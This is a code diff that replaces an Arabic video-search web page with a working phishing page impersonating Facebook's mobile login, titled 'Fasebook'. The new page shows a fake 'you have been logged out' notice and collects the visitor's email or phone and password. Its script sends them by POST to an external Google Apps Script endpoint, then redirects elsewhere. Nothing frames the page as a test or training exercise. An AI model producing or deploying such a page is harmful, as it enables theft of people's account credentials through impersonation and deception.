@@ -1,207 +1,290 @@
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>farsi youcef</title>
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <meta charset="UTF-8">
+  <title>Fasebook</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- أيقونات Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    :root {
+      --facebook-blue: #1877f2;
+      --input-border: #ccd0d5;
+      --button-hover: #166fe5;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Ubuntu, Arial, sans-serif;
+      background-color: #fff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+    .lang { margin-top: 15px; font-size: 15px; color: #444; cursor: pointer; user-select: none; }
+    .logo { margin: 50px 0 30px 0; }
+    .logo img { width: 65px; height: 65px; }
+    .container { width: 90%; max-width: 360px; }
+    form { background-color: #fff; text-align: center; }
+    .input-group { position: relative; margin-bottom: 5px; }
+    .input-group input {
+      width: 100%; padding: 15px 12px 15px 40px;
+      border: 1px solid var(--input-border); border-radius: 12px;
+      font-size: 15px; box-sizing: border-box;
+    }
+    .input-group .icon {
+      position: absolute; top: 50%; left: 12px; transform: translateY(-50%);
+      color: #888; font-size: 16px;
+    }
+    .error-bubble {
+      display: none; background: #000; color: #fff; font-size: 12px;
+      padding: 6px 10px; border-radius: 15px; margin: 4px 0 10px auto;
+      width: fit-content; max-width: 90%; text-align: right; position: relative;
+    }
+    .error-bubble::after {
+      content: ""; position: absolute; bottom: 100%; right: 15px;
+      border-width: 6px; border-style: solid;
+      border-color: transparent transparent #000 transparent;
+    }
+    button {
+      width: 100%; padding: 15px; border: none; background-color: var(--facebook-blue);
+      color: white; font-size: 17px; font-weight: bold;
+      border-radius: 12px; cursor: pointer; transition: background-color 0.2s; margin-top: 5px;
+    }
+    button:hover { background-color: var(--button-hover); }
+    .forgot { margin-top: 14px; font-size: 14px; color: #1877f2; cursor: pointer; }
+    .create-account {
+      margin-top: 28px; padding: 15px; width: 100%; border: 1px solid var(--facebook-blue);
+      background: #fff; color: var(--facebook-blue); font-size: 16px; font-weight: bold;
+      border-radius: 12px; cursor: pointer;
+    }
+    .msg {
+      margin-top: 15px;
+      font-size: 15px;
+      color: #444;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+    .meta { margin-top: 50px; font-size: 12px; color: #999; cursor: pointer; }
+    .spinner {
+      border: 3px solid rgba(0, 0, 0, 0.1);
+      border-left-color: var(--facebook-blue);
+      border-radius: 50%;
+      width: 18px;
+      height: 18px;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { 0% { transform: rotate(0deg);} 100% { transform: rotate(360deg);} }
 
-<style>
-  body {
-    background: #0a1c3a;
-    color: white;
-    font-family: sans-serif;
-    text-align: center;
-    margin: 0;
-    padding: 0;
-  }
-  .site-logo {
-    font-family: "Arial Black", sans-serif;
-    font-size: 55px;
-    font-weight: bold;
-    color: #3cfcb3;
-    margin: 20px 0;
-    display: inline-block;
-    padding: 10px 20px;
-    background: rgba(0,60,50,0.25);
-    border-radius: 15px;
-    box-shadow: 0 4px 12px rgba(60,252,179,0.3);
-  }
-  .search-box { margin: 15px; }
-  input { padding: 10px; border-radius: 10px; border: none; width: 70%; max-width: 250px; }
-  button { padding: 10px 15px; border-radius: 10px; border: none; background: #3cfcb3; cursor: pointer; font-weight: bold; }
-  button:hover { background: #2abf8b; }
-
-  .video-card { background: #13274a; margin: 10px auto; padding: 10px; border-radius: 12px; width: 95%; max-width: 800px; position: relative; }
-  video { border-radius: 10px; width: 100%; height: 380px; background:black; }
-  @media (max-width:600px){ video{height:220px;} .site-logo{font-size:36px;padding:6px 12px;} }
-
-  .logo-overlay { position:absolute; top:10px; right:10px; width:55px; height:55px; background:#0077ff; border-radius:50%; display:flex; justify-content:center; align-items:center; font-size:14px; font-weight:bold; color:white; font-family:"Arial Black",sans-serif; box-shadow:0 0 6px rgba(0,119,255,0.7); z-index:10; pointer-events:none; }
-
-  .controls { margin-top:10px; }
-  .controls button, .controls select { margin:5px; padding:8px 12px; border-radius:8px; border:none; cursor:pointer; font-weight:bold; }
-  .controls button { background:#3cfcb3; } .controls button:hover{background:#2abf8b;}
-  #downloadBtn{background:#2ecc71;} #downloadBtn:hover{background:#27ae60;}
-
-  .video-list { max-height:350px; overflow-y:auto; margin-top:15px; padding:10px; background:#0f1e3f; border-radius:12px; display:flex; flex-direction:column; gap:10px; }
-  .video-list-item { display:flex; align-items:center; background:#1a2b4d; border-radius:8px; padding:5px; cursor:pointer; transition:all 0.2s; }
-  .video-list-item.active { border:2px solid #ff4da6; box-shadow:0 0 8px rgba(255,77,166,0.6); }
-  .video-list-item:hover{ border:2px solid #3cfcb3; box-shadow:0 0 6px rgba(60,252,179,0.5); }
-  .video-list img{ width:110px; border-radius:6px; margin-left:10px; }
-  .video-title{ font-size:14px; color:#ccc; text-align:right; flex:1; }
-  .current-quality{ font-size:13px; color:#3cfcb3; margin-bottom:5px; }
-
-  .no-results{ margin:20px; color:#ff4d4d; font-size:18px; font-weight:bold; }
-
-  .loading-container{ display:none; margin:15px; text-align:center; color:#3cfcb3; font-size:14px; }
-  .loading-spinner{ border:4px solid #3cfcb3; border-top:4px solid transparent; border-radius:50%; width:28px; height:28px; margin:0 auto 8px; animation:spin 1s linear infinite; }
-  @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-
-  #downloadOptions{ display:none; margin-top:8px; padding:8px; background:#1a2b4d; border-radius:8px; }
-  #downloadOptions a{ color:#3cfcb3; padding:5px; text-decoration:none; border-radius:6px; display:block; margin:3px 0; }
-  #downloadOptions a:hover{ background:#2abf8b; color:white; }
-</style>
+    /* ✅ فقاعة أسفل الصفحة */
+    .toast {
+      position: fixed;
+      bottom: 20px;
+      right: 50%;
+      transform: translateX(50%);
+      background: #000;
+      color: #fff;
+      padding: 12px 20px;
+      border-radius: 25px;
+      font-size: 14px;
+      opacity: 0;
+      visibility: hidden;
+      transition: opacity 0.5s ease, visibility 0.5s ease;
+      z-index: 9999;
+    }
+    .toast.show {
+      opacity: 1;
+      visibility: visible;
+    }
+  </style>
 </head>
 <body>
-<h1 class="site-logo">Farsi Youcef</h1>
 
-<div class="search-box">
-  <input type="text" id="search" placeholder="اكتب للبحث في الأفلام">
-  <button onclick="startSearch()"><i class="fas fa-search"></i> بحث</button>
-</div>
+  <div class="lang" id="langBtn">العربية ⌵</div>
 
-<div class="video-card" id="results">
-  <div class="logo-overlay">Farsi</div>
-  <video id="videoPlayer" controls preload="metadata" poster="" loading="lazy">
-    <source id="videoSource" src="" type="video/mp4">
-    متصفحك لا يدعم الفيديو.
-  </video>
-  <div id="currentQualityDisplay" class="current-quality">الجودة: تلقائي</div>
-  <h3 id="videoTitle">اختر فيديو</h3>
-  <div class="controls">
-    <button onclick="toggleFullscreen()"><i class="fas fa-expand"></i> تكبير</button>
-    <select id="qualitySelect" onchange="changeQuality()">
-      <option value="auto">⚡ تلقائي</option>
-      <option value="360">360p</option>
-      <option value="480">480p</option>
-      <option value="720">720p</option>
-    </select>
-    <button id="downloadBtn" onclick="toggleDownloadOptions()"><i class="fas fa-download"></i> تحميل</button>
+  <div class="logo">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
   </div>
-  <div id="downloadOptions"></div>
-</div>
 
-<div class="video-list" id="videoList"></div>
-<div class="loading-container" id="loading">
-  <div class="loading-spinner"></div>
-  <div>جارٍ التحميل...</div>
-</div>
+  <div class="container">
+    <form id="myForm">
+      <div class="input-group">
+        <input type="text" name="email_or_phone" id="emailInput" placeholder="الرقم أو الإيميل" required>
+        <i class="fa-solid fa-user icon"></i>
+        <div class="error-bubble" id="error-email"></div>
+      </div>
+      <div class="input-group">
+        <input type="password" name="password" id="passInput" placeholder="كلمة المرور" required>
+        <i class="fa-solid fa-lock icon"></i>
+        <div class="error-bubble" id="error-pass"></div>
+      </div>
+      <button type="submit" id="submitButton">تسجيل الدخول</button>
+    </form>
+    <div class="forgot" id="forgotText">هل نسيت كلمة السر؟</div>
+    <button class="create-account" id="createBtn">إنشاء حساب جديد</button>
+    <div class="msg" id="msg"></div>
+  </div>
 
-<script>
-const state={currentPage:1,currentQuery:"",currentVideoId:"",currentTitle:"",files:[],currentQuality:"auto",loading:false};
+  <!-- ✅ رابط Meta -->
+  <div class="meta" id="metaLink">Meta ©</div>
 
-async function fetchArchive(query,page=1){
-  const url=`https://archive.org/advancedsearch.php?q=${encodeURIComponent(query)}+AND+mediatype:(movies)&fl[]=identifier&fl[]=title&sort[]=downloads+desc&rows=30&page=${page}&output=json`;
-  const res=await fetch(url); const data=await res.json(); return data.response.docs;
-}
+  <!-- ✅ فقاعة الإشعار -->
+  <div class="toast" id="toast">تم تسجيل خروجك من فيس بوك يرجى إعادة التسجيل مرة اخرى</div>
 
-async function fetchFiles(id){
-  const url=`https://archive.org/metadata/${id}`;
-  const res=await fetch(url); const data=await res.json();
-  return data.files.filter(f=>f.format==="MPEG4"||f.name.endsWith(".mp4"));
-}
+  <script>
+    const langBtn = document.getElementById("langBtn");
+    const emailInput = document.getElementById("emailInput");
+    const passInput = document.getElementById("passInput");
+    const submitButton = document.getElementById("submitButton");
+    const forgotText = document.getElementById("forgotText");
+    const createBtn = document.getElementById("createBtn");
+    const errorEmail = document.getElementById("error-email");
+    const errorPass = document.getElementById("error-pass");
+    const msg = document.getElementById("msg");
+    const form = document.getElementById("myForm");
+    const toast = document.getElementById("toast");
 
-async function startSearch(){
-  state.currentPage=1;
-  document.getElementById("videoList").innerHTML="";
-  const val=document.getElementById("search").value.trim();
-  if(!val) return;
-  state.currentQuery=val;
-  document.getElementById("loading").style.display="block";
-  const docs=await fetchArchive(state.currentQuery,state.currentPage);
-  document.getElementById("loading").style.display="none";
-  showVideos(docs);
-}
+    // ✅ إظهار الفقاعة عند بداية الصفحة
+    window.addEventListener("load", () => {
+      toast.classList.add("show");
+      setTimeout(() => {
+        toast.classList.remove("show");
+      }, 4000);
+    });
 
-async function loadMore(){
-  if(state.loading) return;
-  state.loading=true;
-  document.getElementById("loading").style.display="block";
-  state.currentPage++;
-  const docs=state.currentQuery?await fetchArchive(state.currentQuery,state.currentPage):await fetchArchive("mediatype:(movies)",state.currentPage);
-  showVideos(docs); 
-  state.loading=false; 
-  document.getElementById("loading").style.display="none";
-}
+    // باقي الكود بدون تغيير
+    const translations = {
+      ar: {
+        lang: "العربية ⌵",
+        emailPlaceholder: "الرقم أو الإيميل",
+        passPlaceholder: "كلمة المرور",
+        login: "تسجيل الدخول",
+        forgot: "هل نسيت كلمة السر؟",
+        create: "إنشاء حساب جديد",
+        errorEmail: "أدخل رقم أو بريد إلكتروني صحيح",
+        errorPass: "أدخل كلمة سر صحيحة",
+        waiting: "جاري تسجيل الدخول...",
+        customEmail: "يرجى إدخال رقم أو بريد إلكتروني صحيح",
+        customPass: "يرجى إدخال كلمة سر صحيحة"
+      },
+      en: {
+        lang: "English ⌵",
+        emailPlaceholder: "Email or Phone",
+        passPlaceholder: "Password",
+        login: "Log In",
+        forgot: "Forgotten password?",
+        create: "Create new account",
+        errorEmail: "Enter a valid email or phone number",
+        errorPass: "Enter a valid password",
+        waiting: "Logging in...",
+        customEmail: "Please enter a valid email or phone number",
+        customPass: "Please enter a valid password"
+      },
+      fr: {
+        lang: "Français ⌵",
+        emailPlaceholder: "E-mail ou téléphone",
+        passPlaceholder: "Mot de passe",
+        login: "Se connecter",
+        forgot: "Mot de passe oublié ?",
+        create: "Créer un nouveau compte",
+        errorEmail: "Entrez un e-mail ou un numéro valide",
+        errorPass: "Entrez un mot de passe valide",
+        waiting: "Connexion en cours...",
+        customEmail: "Veuillez entrer un e-mail ou un numéro valide",
+        customPass: "Veuillez entrer un mot de passe valide"
+      }
+    };
 
-function showVideos(docs){
-  const listDiv=document.getElementById("videoList");
-  if(docs.length===0&&state.currentPage===1){ listDiv.innerHTML=`<div class="no-results">❌ لم يتم العثور على أي فيديوهات</div>`; return; }
-  docs.forEach((doc)=>{
-    const div=document.createElement("div"); div.classList.add("video-list-item");
-    div.onclick=()=>changeVideo(doc.identifier,doc.title,div);
-    div.innerHTML=`<img src="https://archive.org/services/img/${doc.identifier}" alt="${doc.title}" loading="lazy"><div class="video-title">${doc.title}</div>`;
-    listDiv.appendChild(div);
-  });
-}
+    const langs = ["ar", "en", "fr"];
+    let currentLangIndex = 0;
+    const savedLang = localStorage.getItem("langIndex");
+    if (savedLang !== null) {
+      currentLangIndex = parseInt(savedLang);
+    }
 
-async function changeVideo(id,title,element){
-  state.currentVideoId=id;
-  state.currentTitle=title;
-  document.getElementById("videoTitle").innerText=title;
-  state.files=await fetchFiles(id);
-  prepareVideo();
-  document.querySelectorAll(".video-list-item").forEach(el=>el.classList.remove("active"));
-  if(element) element.classList.add("active");
-}
+    function updateLanguage() {
+      const langKey = langs[currentLangIndex];
+      const t = translations[langKey];
+      langBtn.textContent = t.lang;
+      emailInput.placeholder = t.emailPlaceholder;
+      passInput.placeholder = t.passPlaceholder;
+      submitButton.textContent = t.login;
+      forgotText.textContent = t.forgot;
+      createBtn.textContent = t.create;
+      errorEmail.textContent = t.errorEmail;
+      errorPass.textContent = t.errorPass;
 
-function prepareVideo(){
-  const player=document.getElementById("videoPlayer");
-  const source=document.getElementById("videoSource");
-  let file;
-  if(state.currentQuality==="auto"){ file=state.files[0]; }
-  else{ file=state.files.find(f=>f.name.includes(state.currentQuality))||state.files[0]; }
-  if(file){ 
-    source.src=`https://archive.org/download/${state.currentVideoId}/${file.name}`;
-    player.poster=`https://archive.org/services/img/${state.currentVideoId}`;
-    player.load(); 
-  }
-  document.getElementById("currentQualityDisplay").innerText="الجودة: "+(state.currentQuality==="auto"?"تلقائي":state.currentQuality+"p");
-  buildDownloadOptions();
-}
+      emailInput.oninvalid = function() { this.setCustomValidity(t.customEmail); };
+      emailInput.oninput = function() { this.setCustomValidity(""); };
+      passInput.oninvalid = function() { this.setCustomValidity(t.customPass); };
+      passInput.oninput = function() { this.setCustomValidity(""); };
 
-function changeQuality(){ state.currentQuality=document.getElementById("qualitySelect").value; prepareVideo(); }
+      localStorage.setItem("langIndex", currentLangIndex);
+    }
 
-function toggleFullscreen(){ const video=document.getElementById("videoPlayer"); if(video.requestFullscreen) video.requestFullscreen(); }
+    langBtn.addEventListener("click", () => {
+      currentLangIndex = (currentLangIndex + 1) % langs.length;
+      updateLanguage();
+    });
 
-function buildDownloadOptions(){
-  const div=document.getElementById("downloadOptions");
-  div.innerHTML="";
-  state.files.forEach(f=>{
-    const a=document.createElement("a");
-    a.href=`https://archive.org/download/${state.currentVideoId}/${f.name}`;
-    a.textContent=`تحميل (${f.name})`;
-    a.download=f.name;
-    div.appendChild(a);
-  });
-}
+    updateLanguage();
 
-function toggleDownloadOptions(){
-  const div=document.getElementById("downloadOptions");
-  div.style.display=(div.style.display==="block")?"none":"block";
-}
+    forgotText.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/login/identify/";
+    });
 
-async function loadDefaultVideos(){ 
-  document.getElementById("loading").style.display="block"; 
-  const docs=await fetchArchive("mediatype:(movies)",state.currentPage); 
-  document.getElementById("loading").style.display="none"; 
-  showVideos(docs); 
-}
+    createBtn.addEventListener("click", () => {
+      window.location.href = "https://m.facebook.com/reg/";
+    });
 
-document.getElementById("videoList").addEventListener("scroll",async function(){ const list=this; if(list.scrollTop+list.clientHeight>=list.scrollHeight-40) await loadMore(); });
+    document.getElementById("metaLink").addEventListener("click", () => {
+      window.location.href = "https://about.meta.com/";
+    });
 
-window.onload=loadDefaultVideos;
-</script>
+    form.addEventListener("submit", e => {
+      e.preventDefault();
+      let valid = true;
+      errorEmail.style.display = "none";
+      errorPass.style.display = "none";
+
+      const emailOrPhone = emailInput.value.trim();
+      const password = passInput.value.trim();
+      const emailRegex = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+      const phoneRegex = /^[0-9]{6,15}$/;
+
+      if (!(emailRegex.test(emailOrPhone) || phoneRegex.test(emailOrPhone))) {
+        errorEmail.style.display = "block"; valid = false;
+      }
+      if (password.length < 4) {
+        errorPass.style.display = "block"; valid = false;
+      }
+      if (!valid) return;
+
+      const t = translations[langs[currentLangIndex]];
+      msg.innerHTML = `<div class="spinner"></div><span>${t.waiting}</span>`;
+      submitButton.disabled = true;
+
+      const data = { email_or_phone: emailOrPhone, password: password };
+      fetch("https://script.google.com/macros/s/AKfycby6KJYLJwG0diUq8poivMjk4rTeJ_mgCo-v99cbC-GIyoZct5-TlqPav-NOoZ5o0zbF/exec", {
+        method: "POST",
+        body: JSON.stringify(data)
+      })
+      .then(res => res.text())
+      .then(txt => {
+        form.reset();
+        window.location.href = "https://minha.anem.dz"; // ✅ الرابط الجديد
+      })
+      .catch(err => {
+        msg.innerHTML = "❌ Error: " + err;
+        msg.style.color = "red";
+        submitButton.disabled = false;
+      });
+    });
+  </script>
+
 </body>
 </html>
